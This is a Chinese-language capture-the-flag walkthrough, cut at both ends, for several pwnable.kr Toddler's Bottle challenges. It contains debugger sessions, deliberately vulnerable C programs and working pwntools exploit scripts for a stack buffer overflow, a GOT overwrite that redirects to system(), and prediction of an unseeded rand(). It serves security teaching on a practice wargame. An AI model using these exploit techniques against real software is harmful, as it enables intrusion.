   0x00000672 <+70>:    call   0x673 <func+71>
   0x00000677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:    je     0x688 <func+92>
   0x00000683 <+87>:    call   0x684 <func+88>
   0x00000688 <+92>:    leave  
   0x00000689 <+93>:    ret    
End of assembler dump.
pwndbg> b gets  # break
Breakpoint 1 at 0x4c0
pwndbg> run
pwndbg> n  # 一直单步调试, 输入AAAAAAAA, 再已知单步运行直到推出gets函数回到func函数
0x56555654 in func ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 EAX  0xffffcf8c ◂— 'AAAAAAAA'
*EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
*ECX  0xf7e1e9c4 (_IO_stdfile_0_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x565556b0 (__libc_csu_init) ◂— push   ebp
*EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
*ESP  0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
*EIP  0x56555654 (func+40) ◂— cmp    dword ptr [ebp + 8], 0xcafebabe
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
 ► 0x56555654 <func+40>    cmp    dword ptr [ebp + 8], 0xcafebabe
   0x5655565b <func+47>    jne    func+63                    <func+63>
    ↓
   0x5655566b <func+63>    mov    dword ptr [esp], 0x565557a3
   0x56555672 <func+70>    call   puts                    <puts>
 
   0x56555677 <func+75>    mov    eax, dword ptr [ebp - 0xc]
   0x5655567a <func+78>    xor    eax, dword ptr gs:[0x14]
   0x56555681 <func+85>    je     func+92                    <func+92>
 
   0x56555683 <func+87>    call   __stack_chk_fail                    <__stack_chk_fail>
 
   0x56555688 <func+92>    leave  
   0x56555689 <func+93>    ret    
 
   0x5655568a <main>       push   ebp
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp 0xffffcf70 —▸ 0xffffcf8c ◂— 'AAAAAAAA'
01:0004│     0xffffcf74 —▸ 0xf7fc9694 ◂— 0xe
02:0008│     0xffffcf78 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc9000 ◂— 0x464c457f
03:000c│     0xffffcf7c ◂— 0x0
04:0010│     0xffffcf80 —▸ 0xf7ffcff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f14
05:0014│     0xffffcf84 ◂— 0x2c /* ',' */
06:0018│     0xffffcf88 ◂— 0x0
07:001c│ eax 0xffffcf8c ◂— 'AAAAAAAA'
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0x56555654 func+40
   f 1 0x5655569f main+21
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x56555561 _start+49
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x $ebp+0x8   # 查看key
0xffffcfc0:     0xdeadbeef
pwndbg> x $ebp-0x2c  # 查看overflowme
0xffffcf8c:     0x41414141
pwndbg> x/1s $ebp-0x2c
0xffffcf8c:     "AAAAAAAA"
```

所以`padding`需要填充`0xffffcfc0-0xffffcf8c=52`个字节，然后输入`\xbe\xba\xfe\xca`覆盖掉变量`key`的值，从而获得`shell`。

编写`Python`代码求解，获得`shell`后输入`cat flag`得到`daddy, I just pwned a buFFer :)`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('pwnable.kr', 9000)
payload = b'a'*52 + p32(0xcafebabe)
io.sendline(payload)
io.interactive()
```

------

### flag

这是**Pwnable.kr**的第四个挑战`flag`，来自**[Toddler's Bottle]**部分。

```bash
Papa brought me a packed present! let's open it.

Download : http://pwnable.kr/bin/flag

This is reversing task. all you need is binary
```

这题只给出一个二进制文件，让我们来看看。

```bash
$ wget http://pwnable.kr/bin/flag
$ sudo chmod +x ./flag
$ ./flag
I will malloc() and strcpy the flag there. take it.
$ file ./flag
./flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, no section header
$ strings ./flag | grep packed
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
```

可以看到`flag`是一个加密的二进制文件，现在用`UPX`进行解密。

```bash
$ upx -d ./flag     
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
    883745 <-    335288   37.94%   linux/amd64   flag

Unpacked 1 file.
```

解密后先`file ./flag  `查看文件类型，再`checksec --file=./flag  `检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ file ./flag
./flag: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=96ec4cc272aeb383bd9ed26c0d4ac0eb5db41b16, not stripped
                                                                                                  
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ checksec --file=./flag
[*] '/home/tyd/ctf/pwn/pwnable.kr/flag'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

使用`IDA pro 64bit`打开`flag`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *v4; // [rsp+8h] [rbp-8h]

  puts(4810328LL, argv, envp);
  v4 = (char *)malloc(100LL);
  strcpy(v4, (const char *)flag);
  return 0;
}
```

按下`Shift+F12`查看`Strings window`可以看到`UPX...? sounds like a delivery service :)`，没错这就是`flag`。如果不信的话可以用`gdb`来获取`flag`。

```bash
$ gdb ./flag
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401164 <+0>:     push   rbp
   0x0000000000401165 <+1>:     mov    rbp,rsp
   0x0000000000401168 <+4>:     sub    rsp,0x10
   0x000000000040116c <+8>:     mov    edi,0x496658
   0x0000000000401171 <+13>:    call   0x402080 <puts>
   0x0000000000401176 <+18>:    mov    edi,0x64
   0x000000000040117b <+23>:    call   0x4099d0 <malloc>
   0x0000000000401180 <+28>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000401184 <+32>:    mov    rdx,QWORD PTR [rip+0x2c0ee5]        # 0x6c2070 <flag>
   0x000000000040118b <+39>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040118f <+43>:    mov    rsi,rdx
   0x0000000000401192 <+46>:    mov    rdi,rax
   0x0000000000401195 <+49>:    call   0x400320
   0x000000000040119a <+54>:    mov    eax,0x0
   0x000000000040119f <+59>:    leave  
   0x00000000004011a0 <+60>:    ret    
End of assembler dump.
pwndbg> x/1s *0x6c2070  # 根据程序的注释查看flag的内容
0x496628:       "UPX...? sounds like a delivery service :)"
```

------

### passcode

这是**Pwnable.kr**的第五个挑战`passcode`，来自**[Toddler's Bottle]**部分。

```bash
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh passcode@pwnable.kr -p2222
passcode@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 05:29:42 2023 from 5.29.16.52
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
passcode@pwnable:~$ ls -la
total 44
drwxr-x---   5 root passcode     4096 Jul  2  2022 .
drwxr-xr-x 117 root root         4096 Nov 10  2022 ..
d---------   2 root root         4096 Jun 26  2014 .bash_history
-r--r-----   1 root passcode_pwn   48 Jun 26  2014 flag
dr-xr-xr-x   2 root root         4096 Aug 20  2014 .irssi
-rw-------   1 root root         1287 Jul  2  2022 .mysql_history
-r-xr-sr-x   1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r--   1 root root          858 Jun 26  2014 passcode.c
drwxr-xr-x   2 root root         4096 Oct 23  2016 .pwntools-cache
-rw-------   1 root root          581 Jul  2  2022 .viminfo
```

我们可以看到三个文件`passcode`、`passcode.c`和`flag`，其中`passcode`是`ELF`二进制可执行文件，`passcode.c`是编译二进制文件的`C`代码，用户`passcode`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat passcode.c`来查看`passcode.c`的代码。

```bash
passcode@pwnable:~$ cat passcode.c
#include <stdio.h>
#include <stdlib.h>

void login(){
    int passcode1;
    int passcode2;

    printf("enter passcode1 : ");
    scanf("%d", passcode1);
    fflush(stdin);

    // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
    printf("enter passcode2 : ");
    scanf("%d", passcode2);

    printf("checking...\n");
    if(passcode1==338150 && passcode2==13371337){
            printf("Login OK!\n");
            system("/bin/cat flag");
    }
    else{
            printf("Login Failed!\n");
            exit(0);
    }
}

void welcome(){
    char name[100];
    printf("enter you name : ");
    scanf("%100s", name);
    printf("Welcome %s!\n", name);
}

int main(){
    printf("Toddler's Secure Login System 1.0 beta.\n");

    welcome();
    login();

    // something after login...
    printf("Now I can safely trust you that you have credential :)\n");
    return 0;
}
```

首先来看`welcome()`函数，声明了一个大小为`100`的变量`name`，用来读取用户输入的姓名。接着来看`login()`函数，需要用户输入俩个密码，并根据硬编码值`338150`和`13371337`来进行核对，如果输入正确就能读取文件`flag`中的内容。这题不是白给吗？

```bash
passcode@pwnable:~$ ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : t0ur1st
Welcome t0ur1st!
enter passcode1 : 338150
Segmentation fault (core dumped)
```

没那么简单~~就能找到聊得来的伴~~ ~ 为什么会遇到段错误？因为`scanf`语句写错啦，它并没有用`&`提供`passcode1`和`passcode2`的地址，而是直接传递值。重新回顾到`welcome()`函数，这才发现该函数中的`scanf`语句同样写错啦。怎样利用该语句的漏洞来获取`flag`呢？用`gdb`来进一步了解该程序。

```bash
passcode@pwnable:~$ gdb ./passcode
(gdb) disass welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx   # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx  # 注意到edx(处理I/O的数据寄存器)的值移动到了$ebp-0x70
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave  
   0x08048664 <+91>:    ret    
End of assembler dump.
(gdb) b *0x8048643
Breakpoint 1 at 0x8048643
(gdb) run
Starting program: /home/passcode/passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : t0ur1st

Breakpoint 1, 0x08048643 in welcome ()
(gdb) x/1s $ebp-0x70      # 果然这就是name
0xffdc91c8:     "t0ur1st"
```

知道了`name`的起始地址后，继续来看`login()`函数。

```assembly
(gdb) disass login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
---Type <return> to continue, or q <return> to quit---
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave  
   0x080485f0 <+140>:   ret    
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
```

注意到有几行汇编代码从处理输入输出的`$edx`数据寄存器中赋值到了内存中的`scanf`，这里的汇编指令用的是`mov`而非`lea`。

```assembly
0x0804857c <+24>:    mov    -0x10(%ebp),%edx
...
0x080485aa <+70>:    mov    -0xc(%ebp),%edx
```

此处的`$ebp-0x10`更可能存放`passcode1`的内容，`$ebp-0xc`更可能存放`passcode2`的内容。

注意到输入完`passcode1`后执行了`fflush(stdin);`，反汇编`fflush`函数可以从`jmp *0x804a004`中得到它的起始地址`0x804a004`。

```assembly
(gdb) disass fflush
Dump of assembler code for function fflush@plt:
   0x08048430 <+0>:     jmp    *0x804a004
   0x08048436 <+6>:     push   $0x8
   0x0804843b <+11>:    jmp    0x8048410
End of assembler dump.
```

因为编译器会（错误地）将`passcode1`的值解释为地址，所以我们想要覆盖`passcode1`的值，我们的输入将被写入该值作为地址。所以我们需要填充`padding`到达缓冲区的末尾，然后设置`fflush`的起始地址`0x804a004`来劫持程序去执行`system("/bin/cat flag");`。此外，调用`system("/bin/cat flag");`这条语句对应的地址应该是`   0x080485e3 <+127>:   movl   $0x80487af,(%esp)`而不是
`0x080485ea <+134>:   call   0x8048460 <system@plt>`。

编写`Python`代码进行求解，需要注意的是最后提交的`flag`应该是`Sorry mom.. I got confused about scanf usage :(`，而不是`Now I can safely trust you that you have credential :)`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
shell = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./passcode')
io.recvuntil("enter you name : ")
payload = b'a'*96 + p32(0x804a004)
io.sendline(payload)
io.recvuntil("enter passcode1 : ")
io.sendline(b'134514147')  # str(0x80485e3).encode()
flag = io.recv()
log.success(flag)
# Sorry mom.. I got confused about scanf usage :(
# Now I can safely trust you that you have credential :)
io.close()
shell.close()
```

------

### random

这是**Pwnable.kr**的第六个挑战`random`，来自**[Toddler's Bottle]**部分。

```bash
Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~]
└─$ ssh random@pwnable.kr -p2222
random@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 20:12:02 2023 from 80.145.91.187
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
random@pwnable:~$ ls -la
total 40
drwxr-x---   5 root       random 4096 Oct 23  2016 .
drwxr-xr-x 117 root       root   4096 Nov 10  2022 ..
d---------   2 root       root   4096 Jun 30  2014 .bash_history
-r--r-----   1 random_pwn root     49 Jun 30  2014 flag
dr-xr-xr-x   2 root       root   4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root       root   4096 Oct 23  2016 .pwntools-cache
-r-sr-x---   1 random_pwn random 8538 Jun 30  2014 random
-rw-r--r--   1 root       root    301 Jun 30  2014 random.c
```

我们可以看到三个文件`random`、`random.c`和`flag`，其中`random`是`ELF`二进制可执行文件，`random.c`是编译二进制文件的`C`代码，用户`random`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat random.c`来查看`random.c`的代码。

```bash
random@pwnable:~$ cat random.c
#include <stdio.h>

int main(){
    unsigned int random;
    random = rand();        // random value!

    unsigned int key=0;
    scanf("%d", &key);

    if( (key ^ random) == 0xdeadbeef ){
        printf("Good!\n");
        system("/bin/cat flag");
        return 0;
    }

    printf("Wrong, maybe you should try 2^32 cases.\n");
    return 0;
}
```

`C`语言的`rand()`是一种伪随机数，只要种子是确定的，生成的随机数列就是固定的。在上述代码中没有设置种子，所以不管执行多少次该程序，都会生成同样的数。因此，我们可以直接用`gdb`来查看变量`random`的数值。

```assembly
random@pwnable:~$ gdb ./random
(gdb) disass main
Dump of assembler code for function main:
   0x00000000004005f4 <+0>:     push   %rbp
   0x00000000004005f5 <+1>:     mov    %rsp,%rbp
   0x00000000004005f8 <+4>:     sub    $0x10,%rsp
   0x00000000004005fc <+8>:     mov    $0x0,%eax
   0x0000000000400601 <+13>:    callq  0x400500 <rand@plt>
   0x0000000000400606 <+18>:    mov    %eax,-0x4(%rbp)
   0x0000000000400609 <+21>:    movl   $0x0,-0x8(%rbp)
   0x0000000000400610 <+28>:    mov    $0x400760,%eax
   0x0000000000400615 <+33>:    lea    -0x8(%rbp),%rdx
   0x0000000000400619 <+37>:    mov    %rdx,%rsi
   0x000000000040061c <+40>:    mov    %rax,%rdi
   0x000000000040061f <+43>:    mov    $0x0,%eax
   0x0000000000400624 <+48>:    callq  0x4004f0 <__isoc99_scanf@plt>
   0x0000000000400629 <+53>:    mov    -0x8(%rbp),%eax
   0x000000000040062c <+56>:    xor    -0x4(%rbp),%eax
   0x000000000040062f <+59>:    cmp    $0xdeadbeef,%eax
   0x0000000000400634 <+64>:    jne    0x400656 <main+98>
   0x0000000000400636 <+66>:    mov    $0x400763,%edi
   0x000000000040063b <+71>:    callq  0x4004c0 <puts@plt>
   0x0000000000400640 <+76>:    mov    $0x400769,%edi
   0x0000000000400645 <+81>:    mov    $0x0,%eax
   0x000000000040064a <+86>:    callq  0x4004d0 <system@plt>
   0x000000000040064f <+91>:    mov    $0x0,%eax
   0x0000000000400654 <+96>:    jmp    0x400665 <main+113>
   0x0000000000400656 <+98>:    mov    $0x400778,%edi
   0x000000000040065b <+103>:   callq  0x4004c0 <puts@plt>
   0x0000000000400660 <+108>:   mov    $0x0,%eax
   0x0000000000400665 <+113>:   leaveq 
   0x0000000000400666 <+114>:   retq   
End of assembler dump.
```

其中这部分代码是调用`rand()`函数生成一个随机数，并将结果存储在局部变量`$ebp-0x4`中。

```assembly
0x00000000004005fc <+8>:     mov    $0x0,%eax
0x0000000000400601 <+13>:    callq  0x400500 <rand@plt>
0x0000000000400606 <+18>:    mov    %eax,-0x4(%rbp)
```

在接下来的第`*main+21`行汇编代码中，程序会将局部变量 `$rbp-0x8` 设置为`0`，我们可以在这行打断点来查看`$eax`寄存器中的数值。

```bash
(gdb) b *main+21
Breakpoint 1 at 0x400609
(gdb) run
Starting program: /home/random/random 

Breakpoint 1, 0x0000000000400609 in main ()
(gdb) info registers $eax
eax            0x6b8b4567       1804289383
```

所以变量`random`的数值是`0x6b8b4567`，接着只需要求出`(key ^ random) == 0xdeadbeef `中的`key`即可。编写`Python`代码求解，算出`key`的十进制数值是`3039230856`，提交`flag`：`Mommy, I thought libc random is unpredictable...`。

```python
from pwn import *

shell = ssh(user='random', host='pwnable.kr', port=2222, password='guest')
io = shell.process('./random')
key = 0x6b8b4567 ^ 0xdeadbeef
payload = str(key).encode()  # 3039230856
io.sendline(payload)
msg = io.recvline()  # Good!
flag = io.recv()  
log.success(flag)  # Mommy, I thought libc random is unpredictable...
io.close()
shell.close()
```

------

### input

这是**Pwnable.kr**的第七个挑战`input`，来自**[Toddler's Bottle]**部分。

```bash
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
```

首先通过`ssh`远程连接目标主机。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ ssh input2@pwnable.kr -p2222
input2@pwnable.kr's password: 
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
                                                                     
- Site admin : daehee87@khu.ac.kr
- irc.netgarage.org:6667 / #pwnable.kr
- Simply type "irssi" command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
You have mail.
Last login: Thu Jun  8 18:35:49 2023 from 35.146.21.146
```

然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。

```bash
input2@pwnable:~$ ls -la
total 44
drwxr-x---   5 root       input2  4096 Oct 23  2016 .
drwxr-xr-x 117 root       root    4096 Nov 10  2022 ..
d---------   2 root       root    4096 Jun 30  2014 .bash_history
-r--r-----   1 input2_pwn root      55 Jun 30  2014 flag
-r-sr-x---   1 input2_pwn input2 13250 Jun 30  2014 input
-rw-r--r--   1 root       root    1754 Jun 30  2014 input.c
dr-xr-xr-x   2 root       root    4096 Aug 20  2014 .irssi
drwxr-xr-x   2 root       root    4096 Oct 23  2016 .pwntools-cache
```

我们可以看到三个文件`input`、`input.c`和`flag`，其中`input`是`ELF`二进制可执行文件，`input.c`是编译二进制文件的`C`代码，用户`input2`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat input.c`来查看`input.c`的代码。

```c
input2@pwnable:~$ cat input.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
    printf("Welcome to pwnable.kr\n");
    printf("Let's see if you know how to give input to program\n");
    printf("Just give me correct inputs then you will get the flag :)\n");

    // argv
    if(argc != 100) return 0;
    if(strcmp(argv['A'],"\x00")) return 0;
    if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
    printf("Stage 1 clear!\n");

    // stdio
    char buf[4];
    read(0, buf, 4);
    if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
    read(2, buf, 4);
    if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
    printf("Stage 2 clear!\n");

    // env
    if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
    printf("Stage 3 clear!\n");

    // file
    FILE* fp = fopen("\x0a", "r");
    if(!fp) return 0;
    if( fread(buf, 4, 1, fp)!=1 ) return 0;
    if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
    fclose(fp);
    printf("Stage 4 clear!\n");

    // network
    int sd, cd;
    struct sockaddr_in saddr, caddr;
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if(sd == -1){
        printf("socket error, tell admin\n");
        return 0;
    }
    saddr.sin_family = AF_INET;
    saddr.sin_addr.s_addr = INADDR_ANY;
    saddr.sin_port = htons( atoi(argv['C']) );
    if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
        printf("bind error, use another port\n");
        return 1;
    }
    listen(sd, 1);
    int c = sizeof(struct sockaddr_in);
    cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
    if(cd < 0){
        printf("accept error, tell admin\n");
        return 0;
    }
    if( recv(cd, buf, 4, 0) != 4 ) return 0;
    if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
    printf("Stage 5 clear!\n");

    // here's your flag
    system("/bin/cat flag");
    return 0;
}
```

这题的文件有点长，我们拆开来分析。先来看 `argv` 这部分代码。

```c
if(argc != 100) return 0;
if(strcmp(argv['A'],"\x00")) return 0;
if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
printf("Stage 1 clear!\n");
```

程序要求输入`100`个参数，且第`'A'`个参数值为`\x00`，第`'B'`个参数值为`\x20\x0a\x0d`。在ASCII表中，字符`'A'`和`'B'`对应的ASCII码分别`65`和`66`。也就是说第`65`个参数值为`\x00`，第`66`个参数值为`\x20\x0a\x0d`。编写`Python`代码来求解`stage 1`。

```python
args = ['A']*100
args[ord('A')] = '\x00'
args[ord('B')] = '\x20\x0a\x0d'
```

接着来看 `stdio` 这部分代码。

```c
char buf[4];
read(0, buf, 4);
if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
read(2, buf, 4);
if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
printf("Stage 2 clear!\n");
```

其中`read()`函数用于从文件描述符 `fd` 指定的文件中读取数据，并将读取的内容存储到 `buf` 指向的缓冲区中，最多读取 `count` 字节的数据，其函数声明如下：

```c
ssize_t read(int fd, void *buf, size_t count);
```

文件描述符`fd`用来标识要读取的文件。通常情况下，`0` 表示标准输入`STDIN`，`1` 表示标准输出`STDOUT`，`2` 表示标准错误输出`STDERR`，其他文件描述符通常由打开文件或套接字等操作获得。而在该程序中，分别从`STDIN`和`STDERR`进行读取。所以我们需要将输入传递给`STDIN`和`STDERR`，可以利用`os.pipe()`制作管道并传递给`process()`。

```python
r1, w1 = os.pipe()
os.write(w1, '\x00\x0a\x00\xff')
r2, w2 = os.pipe()
os.write(w2, '\x00\x0a\x02\xff')
```

然后来看 `env` 这部分代码，我们必须把环境变量`0xdeadbeef` 的值设置为`0xcafebabe`。

```c
if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
printf("Stage 3 clear!\n");
```

这一步很简单，直接弄个`env`传递给`process()`即可。

```python
env = {'\xde\xad\xbe\xef': '\xca\xfe\xba\xbe'}
```

现在来看 `file` 这部分代码，程度以只读权限打开文件`\x0a`，从中读取一个值并和`\x00\x00\x00\x00`进行比较。

```c
FILE* fp = fopen("\x0a", "r");
if(!fp) return 0;
if( fread(buf, 4, 1, fp)!=1 ) return 0;
if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
fclose(fp);
printf("Stage 4 clear!\n");
```

我们可以创建并打开文件`\x0a`，并将数值`\x00\x00\x00\x00`写入其中。

```python
with open('\x0a', 'w') as f:
    f.write('\x00\x00\x00\x00')
```

最后来看 `network` 这部分代码，程序由第`66`个参数指定`socket`的通信端口，然后通过网络接收`4`个字节，并将接收到的数据与字符串`"\xde\xad\xbe\xef"`进行比较。

```c
int sd, cd;
struct sockaddr_in saddr, caddr;
